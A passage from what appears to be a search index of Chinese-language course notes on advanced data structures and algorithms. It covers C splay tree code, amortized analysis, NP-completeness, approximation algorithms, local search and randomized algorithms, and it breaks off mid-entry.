p-&gt;child[1];\n        } else {\n            break;\n        }\n    }\n    if (p == NULL) return INF;\n    splay(tree, p);\n    return p-&gt;key;\n}\n\nvoid erase(SplayTree *tree, int key) {\n    Node *p = tree-&gt;root;\n    while (p != NULL) {\n        if (key == p-&gt;key) {\n            break;\n        } else if (key &lt; p-&gt;key) {\n            p = p-&gt;child[0];\n        } else {\n            p = p-&gt;child[1];\n        }\n    }\n    if (p == NULL) return;\n    splay(tree, p);\n    if (p-&gt;cnt &gt; 1) {\n        p-&gt;cnt--;\n        maintain(p);\n        return;\n    } else if (p-&gt;child[0] == NULL || p-&gt;child[1] == NULL) {\n        Node *q = p-&gt;child[0] ? p-&gt;child[0] : p-&gt;child[1];\n        if (q != NULL) {\n            q-&gt;parent = NULL;\n        }\n        free(p);\n        tree-&gt;root = q;\n        return;\n    } else {\n        p-&gt;child[0]-&gt;parent = p-&gt;child[1]-&gt;parent = NULL;\n        tree-&gt;root = p-&gt;child[0];\n        query_kth(tree, getSize(p-&gt;child[0]));\n        tree-&gt;root-&gt;child[1] = p-&gt;child[1];\n        p-&gt;child[1]-&gt;parent = tree-&gt;root;\n        maintain(tree-&gt;root);\n    }\n}\n\nint query_rank(SplayTree *tree, int key) {\n    insert(tree, key);\n    int res = getSize(tree-&gt;root-&gt;child[0]) + 1;\n    erase(tree, key);\n    return res;\n}\n\nint query_pre(SplayTree *tree, int key) {\n    insert(tree, key);\n    int res = query_kth(tree, getSize(tree-&gt;root-&gt;child[0]));\n    erase(tree, key);\n    return res;\n}\n\nint query_suc(SplayTree *tree, int key) {\n    insert(tree, key);\n    int res = query_kth(tree, getSize(tree-&gt;root-&gt;child[0]) + tree-&gt;root-&gt;cnt + 1);\n    erase(tree, key);\n    return res;\n}\n\nvoid free_tree(Node *p) {\n    if (p == NULL) return;\n    free_tree(p-&gt;child[0]);\n    free_tree(p-&gt;child[1]);\n    free(p);\n}\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n    SplayTree *tree = (SplayTree *)malloc(sizeof(SplayTree));\n    tree-&gt;root = NULL;\n    while (n--) {\n        int opt, x;\n        scanf(\"%d%d\", &amp;opt, &amp;x);\n        switch (opt) {\n        case 1:\n            insert(tree, x);\n            break;\n        case 2:\n            erase(tree, x);\n            break;\n        case 3:\n            printf(\"%d\\n\", query_rank(tree, x));\n            break;\n        case 4:\n            printf(\"%d\\n\", query_kth(tree, x));\n            break;\n        case 5:\n            printf(\"%d\\n\", query_pre(tree, x));\n            break;\n        case 6:\n            printf(\"%d\\n\", query_suc(tree, x));\n            break;\n        }\n        // fprintf(stderr, \"[\");\n        // fprint_tree(tree-&gt;root);\n        // fprintf(stderr, \"]\\n\");\n    }\n    free_tree(tree-&gt;root);\n    return 0;\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#amortized-analysis","title":"Amortized Analysis \u644a\u8fd8\u5206\u6790","text":"<p>\u7531\u4e8e\u7a0b\u5e8f\u4e0d\u4e00\u5b9a\u6bcf\u6b21\u64cd\u4f5c\u90fd\u8fbe\u5230\u6700\u574f\u7684\u590d\u6742\u5ea6\uff0c\u56e0\u6b64\u4f7f\u7528\u6700\u574f\u590d\u6742\u5ea6\u4f30\u8ba1\u590d\u6742\u5ea6\u4e0a\u754c\u53ef\u80fd\u4f1a\u8fdc\u8fdc\u9ad8\u4e8e\u5b9e\u9645\u7684\u590d\u6742\u5ea6\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u66f4\u52a0\u7cbe\u786e\u5730\u4f30\u8ba1\u590d\u6742\u5ea6\u4e0a\u754c\u3002</p> \\[ \\text{worst-case bound} \\geq \\text{amortized bound} \\geq \\text{average-case bound} \\]"},{"location":"cs/ads/chapter1/#aggregate-analysis","title":"Aggregate Analysis \u805a\u5408\u5206\u6790","text":"<p>\u8003\u8651\u64cd\u4f5c\u7684\u6574\u4f53\uff0c\u8bbe \\(n\\) \u4e2a\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\u4e4b\u548c\u4e3a \\(T(n)\\)\uff0c\u5219\u5355\u4e2a\u64cd\u4f5c\u7684\u5747\u644a\u590d\u6742\u5ea6\u4e3a \\(T(n)/n\\)\u3002</p>"},{"location":"cs/ads/chapter1/#accounting-method","title":"Accounting Method \u6838\u7b97\u6cd5","text":"<p>\u82e5\u67d0\u6b21\u64cd\u4f5c\u7684\u644a\u8fd8\u4ee3\u4ef7 \\(\\hat{c}_i\\) \u8d85\u8fc7\u4e86\u5b9e\u9645\u4ee3\u4ef7 \\(c_i\\)\uff0c\u5219\u8bb0\u591a\u51fa\u6765\u7684\u90e8\u5206\u4e3a\u201c\u4fe1\u7528\u5206\u201d\uff08credit\uff09\u3002\u82e5\u4e4b\u540e\u7684\u64cd\u4f5c\u7684\u644a\u8fd8\u4ee3\u4ef7\u4e0d\u8db3\u4ee5\u652f\u4ed8\u5b9e\u9645\u4ee3\u4ef7\uff0c\u5219\u4f7f\u7528\u4fe1\u7528\u5206\u6765\u652f\u4ed8\u3002\u5219\u5355\u6b21\u64cd\u4f5c\u7684\u5747\u644a\u590d\u6742\u5ea6\u4e3a\uff1a</p> \\[ T_{\\text{amortized}} = \\frac{\\sum \\hat{c}_i}{n} \\geq \\frac{\\sum c_i}{n} \\]"},{"location":"cs/ads/chapter1/#potential-method","title":"Potential Method \u52bf\u80fd\u6cd5","text":"<p>\u8bbe \\(D_i\\) \u4e3a\u7b2c \\(i\\) \u6b21\u64cd\u4f5c\u4e4b\u540e\u6570\u636e\u6574\u4f53\u7684\u72b6\u6001\uff0c\u6784\u9020\u51fd\u6570 \\(\\Phi(D_i)\\) \u4f5c\u4e3a\u6570\u636e\u72b6\u6001\u7684\u201c\u52bf\u80fd\u201d\uff0c\u4e14\u6ee1\u8db3\uff1a</p> <ul> <li>\\(\\Phi(D_0) = 0\\)</li> <li>\\(\\Phi(D_i) \\geq 0\\)</li> </ul> <p>\u7531\u6b64\uff0c\u644a\u8fd8\u4ee3\u4ef7\u4e3a\uff1a</p> \\[ \\hat{c}_i = c_i + \\Phi(D_i) - \\Phi(D_{i-1}) \\] <p>\\(n\\) \u6b21\u64cd\u4f5c\u603b\u4ee3\u4ef7\u4e3a\uff1a</p> \\[ \\begin{aligned} \\sum_{i=1}^n \\hat{c}_i &amp;= \\sum_{i=1}^n (c_i + \\Phi(D_i) - \\Phi(D_{i-1})) \\\\                        &amp;= \\sum_{i=1}^n c_i + \\Phi(D_n) - \\Phi(D_0) \\\\ \\end{aligned} \\] <p>\u5f97\u5230 \\(n\\) \u6b21\u64cd\u4f5c\u7684\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(T(n) = \\sum_{i=1}^n c_i + \\Phi(D_n) - \\Phi(D_0)\\)\u3002\u5355\u6b21\u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(T(n)/n\\)\u3002</p> <p>Warning</p> <p>\u52bf\u80fd\u51fd\u6570\u5fc5\u987b\u6ee1\u8db3 \\( \\Phi(D_n) \\geq \\Phi(D_0) \\)\uff0c\u5373\u521d\u59cb\u72b6\u6001\u7684\u52bf\u80fd\u6700\u5c0f\uff0c\u4e00\u822c\u5c06\u5176\u53d6\u4e3a 0\u3002</p> <p>\u6ce8\u610f \\( \\Phi(D_n) \\) \u662f\u5b8c\u6574\u64cd\u4f5c\u4e4b\u540e\u7684\u52bf\u80fd\uff0c\u6700\u540e\u5f97\u51fa\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f\u5b8c\u6574\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\uff0c\u800c\u5176\u5b50\u64cd\u4f5c\u5e26\u6765\u7684\u52bf\u80fd\u53d8\u5316\u4e0d\u7528\u8003\u8651\u3002\u5373\u53ef\u80fd\u5b58\u5728 \\( \\Phi(D_i) &lt; \\Phi(D_0) \\)\uff0c\u4f46\u53ea\u8981\u6ee1\u8db3 \\( \\Phi(D_n) \\geq \\Phi(D_0) \\) \u5373\u53ef\u3002</p>"},{"location":"cs/ads/chapter1/#splay_1","title":"Splay \u590d\u6742\u5ea6\u8bc1\u660e","text":"<p>\u8bbe \\(D_i\\) \u4e3a\u7b2c \\(i\\) \u6b21\u64cd\u4f5c\u4e4b\u540e\u7684 Splay \u6811\uff0c\\(S(x)\\) \u4e3a\u4ee5\u8282\u70b9 \\(x\\) \u4e3a\u6839\u7684\u5b50\u6811\u5927\u5c0f\uff0c\u5b9a\u4e49\u52bf\u80fd\u51fd\u6570\u4e3a\uff1a</p> \\[ \\Phi(T) = \\sum_{x \\in T} \\log S(x) \\] <p>\u4e0b\u9762\u5bf9\u4e09\u79cd\u64cd\u4f5c\u8fdb\u884c\u5206\u7c7b\u8ba8\u8bba\uff0c\u8bbe \\(R_1(x)\\) \u4e3a\u64cd\u4f5c\u524d\u4ee5 \\(x\\) \u4e3a\u6839\u7684\u5b50\u6811\u5927\u5c0f\u7684\u5bf9\u6570\uff0c\\(R_2(x)\\) \u4e3a\u64cd\u4f5c\u540e\u4ee5 \\(x\\) \u4e3a\u6839\u7684\u5b50\u6811\u5927\u5c0f\u7684\u5bf9\u6570\u3002</p> <p>\u7528\u5230\u7684\u4e0d\u7b49\u5f0f</p> <p>\u82e5 \\( a+b \\leq c \\)\uff0c\u5219\u6709\uff1a</p> \\[ \\log a + \\log b \\leq 2\\log c - 2 \\] \u8bc1\u660e <p>\u7531 \\( ab \\leq \\frac{1}{4} (a + b)^2 \\)\uff0c\u5f97</p> \\[ \\begin{aligned} \\log a + \\log b &amp;= \\log(ab) \\\\                 &amp;\\leq \\log \\frac{1}{4} + 2\\log(a+b) \\\\                 &amp;\\leq 2\\log c - 2 \\end{aligned} \\] ZigZig-ZagZig-Zig <p> </p> \\[ \\begin{aligned} \\hat{c}_i &amp;= 1 + R_2(x) - R_1(x) + R_2(p) - R_1(p) \\\\           &amp;\\leq 1 + R_2(x) - R_1(x) \\end{aligned} \\] <p> </p> \\[ \\begin{aligned} \\hat{c}_i &amp;=    2 + R_2(x) - R_1(x) + R_2(p) - R_1(p) + R_2(g) - R_1(g) \\\\           &amp;\\leq 2 - R_1(x) + R_2(p) - R_1(p) + R_2(g) \\\\           &amp;=    2 - R_1(x) - R_1(p) + (R_2(p) + R_2(g)) \\\\           &amp;\\leq - 2R_1(x) + 2R_2(x) \\\\           &amp;=    2(R_2(x) - R_1(x)) \\\\           &amp;\\leq 3(R_2(x) - R_1(x)) \\end{aligned} \\] <p> </p> \\[ \\begin{aligned} \\hat{c}_i &amp;=    2 + R_2(x) - R_1(x) + R_2(p) - R_1(p) + R_2(g) - R_1(g) \\\\           &amp;\\leq 2 - 2R_1(x) + R_2(p) - R_1(p) + (R_1(x) + R_2(g)) \\\\           &amp;\\leq - 2R_1(x) + R_2(x) - R_1(x) + 2R_2(x) \\\\           &amp;=    3(R_2(x) - R_1(x)) \\end{aligned} \\] <p>\u7531\u6b64\u53ef\u5f97\uff0c\u5355\u6b21 AVL \u64cd\u4f5c\uff08insert\uff0cdelete\uff0ce.t.c\uff09\u7684\u5747\u644a\u590d\u6742\u5ea6\u4e3a</p> \\[ T \\leq 1 + 3(R_m(root) - R_0(x)) = O(\\log n) \\]"},{"location":"cs/ads/chapter10/","title":"NP Completeness","text":""},{"location":"cs/ads/chapter10/#halting-problem","title":"Halting Problem","text":"<p>\u505c\u673a\u95ee\u9898\uff0c\u7a0b\u5e8f\u5224\u65ad\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u662f\u5426\u4f1a\u505c\u673a\u3002</p>"},{"location":"cs/ads/chapter10/#the-class-np","title":"The Class NP","text":"<p>Turing Machine</p> <p>\u5047\u8bbe\u6709\u65e0\u9650\u7684 memory\uff0c\u548c\u4e00\u4e2a\u53ef\u4ee5\u5de6\u53f3\u79fb\u52a8\u7684 scanner\uff0c\u53ef\u4ee5\u8bfb\u5199 memory\u3002</p> <ul> <li>Deterministic Turing Machine \u786e\u5b9a\u6027\u56fe\u7075\u673a\uff1a\u6bcf\u6b21\u53ea\u6709\u4e00\u4e2a\u72b6\u6001\u8f6c\u79fb\u3002</li> <li>Non-deterministic Turing Machine \u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff1a\u6bcf\u6b21\u6709\u591a\u4e2a\u53ef\u80fd\u7684\u72b6\u6001\u8f6c\u79fb\uff0c\u6bcf\u6b21\u90fd\u80fd\u9009\u62e9\u4e00\u4e2a\u6b63\u786e\u7684\u8f6c\u79fb\u3002</li> </ul> <ul> <li>NP: Non-deterministic Polynomial-time     \u4e00\u4e2a\u95ee\u9898\u662f NP \u7684\uff0c\u5f53\u4e14\u4ec5\u5f53\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u9a8c\u8bc1\u4e00\u4e2a\u89e3\u662f\u5426\u6b63\u786e\u3002\u53ef\u4ee5\u7531\u4e00\u4e2a\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\u3002</li> <li>P: Polynomial-time     \u4e00\u4e2a\u95ee\u9898\u662f P \u7684\uff0c\u5f53\u4e14\u4ec5\u5f53\u53ef\u4ee5\u7531\u4e00\u4e2a\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\u3002</li> </ul> <p>P \u662f NP \u7684\u5b50\u96c6\u3002</p>"},{"location":"cs/ads/chapter10/#np-completenessnpc-problem","title":"NP-Completeness(NPC) Problem","text":"<p>\u4efb\u4f55 NP \u95ee\u9898\u90fd\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7ea6\u5316\u4e3a NPC \u95ee\u9898\u3002</p>"},{"location":"cs/ads/chapter10/#a-formal-language-framework","title":"A Formal-language Framework","text":"<p>Abstract problem \\(Q\\) \u5305\u542b\u591a\u4e2a instance \\(I\\)\uff0c\u6bcf\u4e2a instance \u5bf9\u5e94\u4e00\u4e2a solution \\(S\\)</p> <p>Shortest Path Problem</p> <ul> <li>\\(I = (G, s, t), G = (V, E), s, t \\in V\\)</li> <li>\\(S = \\langle s, v_1, v_2, \\cdots, t \\rangle, \\langle v_i, v_{i+1} \\rangle \\in E\\)</li> </ul> <p>\u8f6c\u6362\u4e3a decision problem\uff1a</p> <ul> <li>\\(I = (G, s, t, k)\\) \u662f\u5426\u5b58\u5728\u4e00\u6761\u957f\u5ea6\u5c0f\u4e8e \\(k\\) \u7684\u8def\u5f84\u3002 </li> <li>\\(S = \\{\\text{yes}, \\text{no}\\}\\)</li> </ul>"},{"location":"cs/ads/chapter10/#formal-language-theory","title":"Formal Language Theory","text":""},{"location":"cs/ads/chapter11/","title":"Approximation","text":""},{"location":"cs/ads/chapter11/#approximation-ratio","title":"Approximation Ratio","text":"<p>\u5047\u8bbe\u8fd1\u4f3c\u7b97\u6cd5\u7684\u89e3\u4e3a \\(C\\)\uff0c\u6700\u4f18\u89e3\u4e3a \\(C^*\\)\u3002\u90a3\u4e48\u8fd1\u4f3c\u7b97\u6cd5\u7684\u8fd1\u4f3c\u6bd4\u4f8b\u4e3a\uff1a</p> \\[ \\max\\left(\\frac{C}{C^*}, \\frac{C^*}{C}\\right) \\leq \\rho(n) \\] <ul> <li>PTAS: \u5173\u4e8e \\(n\\) \u90fd\u662f\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u8fd1\u4f3c\u7b97\u6cd5\u3002</li> <li>FPTAS: \u5173\u4e8e \\(1/\\epsilon\\) \u548c \\(n\\) \u662f\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u8fd1\u4f3c\u7b97\u6cd5\u3002</li> </ul>"},{"location":"cs/ads/chapter11/#approximate-bin-packing","title":"Approximate Bin Packing","text":"<p>NP-hard \u95ee\u9898</p> <p>\u5047\u8bbe\u7bb1\u5b50\u5927\u5c0f\u4e3a 1\u3002</p>"},{"location":"cs/ads/chapter11/#next-fit","title":"Next Fit","text":"<p>\u6bcf\u6b21\u5c1d\u8bd5\u653e\u5165\u6700\u540e\u4e00\u4e2a\u7bb1\u5b50\uff0c\u5982\u679c\u653e\u4e0d\u4e0b\u5c31\u65b0\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002</p> <p>\u5047\u8bbe\u4f7f\u7528\u4e86 \\(2M\\) \u4e2a\u7bb1\u5b50\uff0c\u8bbe \\(S_i\\) \u4e3a\u7b2c \\(i\\) \u4e2a\u7bb1\u5b50\u88c5\u5165\u7684\u7269\u54c1\u7684\u5927\u5c0f\u4e4b\u548c\u3002\u90a3\u4e48\uff1a</p> \\[ \\begin{aligned} S_1 + S_2 &gt; 1 \\\\ S_2 + S_3 &gt; 1 \\\\ \\cdots \\\\ S_{2M-1} + S_{2M} &gt; 1 \\end{aligned} \\] <p>\u5c06\u6240\u6709\u4e0d\u7b49\u5f0f\u76f8\u52a0\uff0c\u5f97\u5230\uff1a</p> \\[ 2(S_1 + S_2 + \\cdots + S_{2M}) &gt; 2M \\Rightarrow \\sum_{i=1}^{2M} S_i &gt; M \\] <p>\u5219\u6700\u4f18\u89e3\u81f3\u5c11\u9700\u8981</p> \\[ \\lceil \\frac{\\sum_{i=1}^n s_i}{\\text{size of bin}} \\rceil = \\lceil \\sum_{i=1}^n s_i \\rceil \\geq M + 1 \\] <p>\u6240\u4ee5 Next Fit \u7684\u8fd1\u4f3c\u6bd4\u4f8b\u4e3a \\(2\\)\u3002</p>"},{"location":"cs/ads/chapter11/#first-fit","title":"First Fit","text":"<p>\u6bcf\u6b21\u627e\u5230\u7b2c\u4e00\u4e2a\u80fd\u653e\u4e0b\u7684\u7bb1\u5b50\u653e\u5165\uff0c\u5982\u679c\u6ca1\u6709\u5c31\u65b0\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002</p>"},{"location":"cs/ads/chapter11/#best-fit","title":"Best Fit","text":"<p>\u6bcf\u6b21\u627e\u5230\u5269\u4f59\u7a7a\u95f4\u6700\u5c0f\u7684\u7bb1\u5b50\u653e\u5165\uff0c\u5982\u679c\u6ca1\u6709\u5c31\u65b0\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002</p>"},{"location":"cs/ads/chapter11/#worst-fit","title":"Worst Fit","text":"<p>\u6bcf\u6b21\u627e\u5230\u5269\u4f59\u7a7a\u95f4\u6700\u5927\u7684\u7bb1\u5b50\u653e\u5165\uff0c\u5982\u679c\u6ca1\u6709\u5c31\u65b0\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002</p>"},{"location":"cs/ads/chapter11/#knapsack-problem","title":"Knapsack Problem","text":"<p>0-1 \u80cc\u5305\u95ee\u9898\u3002\u8fd1\u4f3c\u6bd4\u4e3a \\(2\\)\u3002</p>"},{"location":"cs/ads/chapter11/#k-center-problem","title":"K-Center Problem","text":""},{"location":"cs/ads/chapter11/#greedy-algorithm","title":"Greedy Algorithm","text":"<p>\u5e73\u9762\u4e0a \\(n\\) \u4e2a\u70b9\uff0c\u627e\u5230 \\(k\\) \u4e2a\u5706\uff0c\u4f7f\u5f97\u6bcf\u4e2a\u70b9\u5230 \\(k\\) \u4e2a\u70b9\u4e2d\u6700\u8fd1\u7684\u5706\u5fc3\u7684\u8ddd\u79bb\u7684\u6700\u5927\u503c\u6700\u5c0f\u3002</p> <p>\u82e5\u5706\u534a\u5f84\u4e3a \\(r\\)\uff0c\u90a3\u4e48\u82e5\u5c06\u5706\u5fc3\u653e\u5728\u70b9\u4e0a\uff0c\u5219\u9700\u8981 \\(2r\\) \u7684\u534a\u5f84\u624d\u80fd\u8986\u76d6\u539f\u672c\u5706\u7684\u8303\u56f4\u3002</p> <p>\u4e8c\u5206\u7b54\u6848\uff0c\u9a8c\u8bc1\uff1a</p> <ol> <li>\u968f\u673a\u627e\u4e00\u4e2a\u70b9\u4f5c\u4e3a\u5706\u5fc3\uff0c\u6392\u9664\u6240\u6709\u8ddd\u79bb\u5c0f\u4e8e \\(2r\\) \u7684\u70b9\u3002</li> <li>\u91cd\u590d 1 \u76f4\u5230\u6240\u6709\u70b9\u90fd\u88ab\u8986\u76d6\u3002</li> <li>\u5982\u679c\u5706\u5fc3\u6570\u91cf\u5927\u4e8e \\(k\\)\uff0c\u8bf4\u660e\u6700\u4f18\u89e3\u5927\u4e8e \\(r\\)\uff0c\u5426\u5219\u5c0f\u4e8e\u7b49\u4e8e \\(r\\)\u3002</li> </ol>"},{"location":"cs/ads/chapter11/#approximation-algorithm","title":"Approximation Algorithm","text":"<ol> <li>\u4efb\u610f\u627e\u4e00\u4e2a\u70b9\u4f5c\u4e3a\u5706\u5fc3\u3002</li> <li>\u627e\u5230\u79bb\u8fd9\u4e2a\u70b9\u6700\u8fdc\u7684\u70b9\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u5706\u5fc3\u3002</li> <li>\u91cd\u590d 2 \u76f4\u5230\u627e\u5230 \\(k\\) \u4e2a\u5706\u5fc3\u3002</li> <li>\u627e\u5230\u80fd\u8986\u76d6\u6240\u6709\u70b9\u7684\u6700\u5c0f\u534a\u5f84\u3002</li> </ol> <p>\u8fd1\u4f3c\u6bd4\u4e3a \\(2\\)\u3002</p> <p>\u9664\u975e P=NP\uff0c\u5426\u5219\u4e0d\u5b58\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u8fd1\u4f3c\u6bd4\u4f8b\u5c0f\u4e8e \\(2\\) \u7684\u7b97\u6cd5\u3002</p>"},{"location":"cs/ads/chapter12/","title":"Local Search","text":"<ul> <li>Local\uff1a\u5b9a\u4e49\u90bb\u5c45\u89e3</li> <li>Search\uff1a\u5728\u90bb\u5c45\u89e3\u4e2d\u641c\u7d22\u6700\u4f18\u89e3</li> </ul>"},{"location":"cs/ads/chapter12/#neighbor-relation","title":"Neighbor Relation","text":"<ul> <li>\\(S \\sim S'\\)\uff1a\\(S'\\) \u662f \\(S\\) \u7684\u76f8\u90bb\u89e3\uff0c\u901a\u8fc7 \\(S\\) \u8f6c\u5316\u5f97\u5230</li> <li>\\(N(S) = \\{S' \\mid S \\sim S'\\}\\)\uff1a\\(S\\) \u7684\u90bb\u5c45\u89e3\u96c6\u5408</li> </ul>"},{"location":"cs/ads/chapter12/#vertex-cover","title":"Vertex Cover","text":"<p>\u7ed9\u5b9a\u56fe \\(G = (V, E)\\)\uff0c\u627e\u5230\u6700\u5c0f\u7684\u9876\u70b9\u96c6\u5408 \\(S \\subseteq V\\)\uff0c\u4f7f\u5f97\u6bcf\u6761\u8fb9\u81f3\u5c11\u6709\u4e00\u4e2a\u7aef\u70b9\u5728 \\(S\\) \u4e2d\u3002</p> <p>\u521d\u59cb\u4ece \\(S\\) \u5f00\u59cb\uff0c\u6bcf\u6b21\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u9876\u70b9 \\(v \\in S\\)\uff0c\u5c06\u5176\u4ece \\(S\\) \u4e2d\u79fb\u9664\uff0c\u76f4\u5230 \\(S\\) \u4e0d\u518d\u662f\u9876\u70b9\u8986\u76d6\u3002</p>"},{"location":"cs/ads/chapter12/#the-metropolis-algorithm","title":"The Metropolis Algorithm","text":"<p>\u6bcf\u6b21\u82e5 \\(S'\\) \u66f4\u4f18\uff0c\u5219\u63a5\u53d7 \\(S'\\) \u4f5c\u4e3a\u65b0\u7684\u89e3\uff0c\u5426\u5219\u4ee5\u4e00\u5b9a\u6982\u7387 \\(e^{-\\Delta \\text{cost} / (kT)}\\) \u63a5\u53d7 \\(S'\\)\u3002</p> <p>\u5176\u4e2d \\(\\Delta \\text{cost} = \\left| \\text{cost}(S) - \\text{cost}(S') \\right|\\)\uff0c\\(k, T\\) \u4e3a\u8d85\u53c2\u6570\u3002</p>"},{"location":"cs/ads/chapter12/#hopfield-neural-network","title":"Hopfield Neural Network","text":"<p>\u56fe \\(G = (V, E)\\) \u6bcf\u6761\u8fb9\u6709\u8fb9\u6743\uff0c\u7ed9\u6bcf\u4e2a\u70b9\u8bbe\u7f6e\u72b6\u6001 \\(s_i \\in \\{-1, 1\\}\\)\u3002</p> <ul> <li>\u5982\u679c \\(w_i &lt; 0\\)\uff0c\u5219\u5e0c\u671b\u4e24\u7aef\u70b9\u72b6\u6001\u76f8\u540c</li> <li>\u5982\u679c \\(w_i &gt; 0\\)\uff0c\u5219\u5e0c\u671b\u4e24\u7aef\u70b9\u72b6\u6001\u4e0d\u540c</li> <li>\\(|w_i|\\) \u8d8a\u5927\uff0c\u7ea6\u5f3a\u8c03\u8fd9\u4e2a\u7ea6\u675f</li> </ul> <p>\u5b9a\u4e49\uff1a</p> <ul> <li>\u8fb9 \\(e = (u, v)\\) \u662f good \u7684\uff0c\u5982\u679c \\(w_e s_u s_v &lt; 0\\)\uff0c\u5426\u5219\u662f bad \u7684\u3002\uff08\u5373\u6ee1\u8db3\u7ea6\u675f\u65f6\u4e3a good\uff09</li> <li> <p>\u70b9 \\(v\\) \u88ab\u6ee1\u8db3\uff0c\u5982\u679c\uff1a</p> \\[     \\sum_{v: e = (u, v) \\in E} w_e s_u s_v \\geq 0 \\] </li> <li> <p>\u5982\u679c\u6240\u6709\u70b9\u90fd\u88ab\u6ee1\u8db3\u4e86\uff0c\u90a3\u4e48\u5b9a\u4e49\u8fd9\u4e2a\u5206\u914d\u662f stable \u7684\u3002</p> </li> </ul>"},{"location":"cs/ads/chapter12/#state-flipping-algorithm","title":"State-flipping Algorithm","text":"<p>\u521d\u59cb\u7ed9\u6bcf\u4e2a\u70b9\u968f\u673a\u72b6\u6001\uff0c\u5982\u679c\u5f53\u524d\u5206\u914d\u4e0d\u662f stable \u7684\uff0c\u5219\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u6ca1\u6709\u88ab\u6ee1\u8db3\u7684\u70b9\uff0c\u5c06\u5176\u72b6\u6001\u7ffb\u8f6c\u3002</p> <p>Proof</p> <p>\u8bc4\u4f30\u89e3 \\(S\\) \u7684\u597d\u574f\uff1a\\(\\Phi(S) = \\sum_{e \\text{ is good}} |w_e|\\)\uff0c\\(\\Phi(S)\\) \u8d8a\u5927\u8d8a\u597d\u3002</p> <p>\u7ffb\u8f6c\u4e86\u4e00\u4e2a\u70b9 \\(u\\) \u540e\uff0c\u539f\u672c\u7684\u597d\u8fb9\u53d8\u4e3a\u574f\u8fb9\uff0c\u574f\u8fb9\u53d8\u4e3a\u597d\u8fb9\uff0c\u6240\u4ee5\uff1a</p> \\[     \\Phi(S') = \\Phi(S) - \\sum_{e: u \\in e, e \\text{ is good in } S} |w_e| + \\sum_{e: u \\in e, e \\text{ is bad in } S} |w_e| \\] <p>\u7531\u4e8e \\(u\\) \u662f\u6ca1\u6709\u88ab\u6ee1\u8db3\u7684\u70b9\uff0c\u6240\u4ee5\uff1a</p> \\[     \\sum_{e: u \\in e, e \\text{ is bad}} |w_e| \\geq \\sum_{e: u \\in e, e \\text{ is good}} |w_e| \\] <p>\u6240\u4ee5 \\(\\Phi(S') \\geq \\Phi(S)\\)\uff0c\u5373\u6bcf\u6b21\u7ffb\u8f6c\u90fd\u80fd\u4f7f\u5f97\u89e3\u66f4\u4f18\u3002</p> <p>\u8fd1\u4f3c\u6bd4\u4e3a \\(2\\)\uff0c\\(w(A, B) \\geq \\frac{1}{2} w(A^*, B^*)\\)\u3002</p>"},{"location":"cs/ads/chapter13/","title":"Randomized Algorithm","text":""},{"location":"cs/ads/chapter13/#_1","title":"\u6982\u7387\u8bba","text":"<ul> <li>\\(\\mathrm{Pr}(A)\\) \u8868\u793a\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6982\u7387</li> <li>\\(\\bar{A}\\) \u8868\u793a\u4e8b\u4ef6 \\(A\\) \u4e0d\u53d1\u751f</li> <li>\\(\\mathrm{E}(X)\\) \u8868\u793a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u671f\u671b</li> </ul>"},{"location":"cs/ads/chapter13/#the-hiring-problem","title":"The Hiring Problem","text":"<p>\u9762\u8bd5\u4e00\u4e2a\u4eba\u540e\u7acb\u5373\u51b3\u5b9a\u662f\u5426\u5f55\u7528\u3002</p> <p>\u9762\u8bd5\u8d39\u7528 \\(C_i\\)\uff0c\u96c7\u4f63\u8d39\u7528 \\(C_h\\)\u3002\\(N\\) \u4e2a\u4eba\uff0c\u96c7\u4f63 \\(M\\) \u4e2a\u4eba\u3002</p>"},{"location":"cs/ads/chapter13/#naive-algorithm","title":"Naive Algorithm","text":"<p>\u6bcf\u6b21\u5982\u679c\u5f53\u524d\u9762\u8bd5\u7684\u4eba\u6bd4\u4e4b\u524d\u6240\u6709\u7684\u4eba\u90fd\u597d\uff0c\u5219\u96c7\u4f63\u3002</p> <p>\u8bbe \\(X\\) \u4e3a\u96c7\u4f63\u7684\u4eba\u6570\uff0c\\(X_i\\) \u4e3a\u7b2c \\(i\\) \u4e2a\u4eba\u662f\u5426\u88ab\u96c7\u4f63\u3002</p> \\[ X_i = \\begin{cases} 1, &amp; \\text{candidate is hired} \\\\ 0, &amp; \\text{candidate is not hired} \\end{cases} \\] <p>\u6bcf\u4e2a\u4eba\u88ab\u96c7\u4f63\u72ec\u7acb\uff0c\u6240\u4ee5</p> \\[ \\mathrm{E}(X) = \\mathrm{E}(\\sum_{i=1}^N X_i) = \\sum_{i=1}^N \\mathrm{E}(X_i) = \\sum_{i=1}^N \\mathrm{Pr}(X_i = 1) = \\sum_{i=1}^N \\frac{1}{i} = \\ln N + O(1) \\]"},{"location":"cs/ads/chapter13/#online-version","title":"Online 